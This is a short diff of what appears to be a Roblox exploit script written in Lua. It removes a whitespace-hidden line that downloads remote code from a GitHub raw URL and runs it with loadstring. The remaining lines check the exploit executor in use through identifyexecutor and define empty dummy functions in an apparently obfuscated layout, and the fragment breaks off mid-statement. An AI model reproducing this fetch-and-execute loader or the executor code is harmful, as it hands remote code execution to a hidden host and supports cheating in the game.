@@ -1,4 +1,4 @@
-                                          loadstring(game:HttpGet("https://raw.githubusercontent.com/a1bara/autodhc/refs/heads/main/config.lua"))()
+
                                                                                       local exe_name,       
                                                                         exe_version=identifyexecutor();local function   
                                                                     home999() end local function home888() end if (exe_name~=     
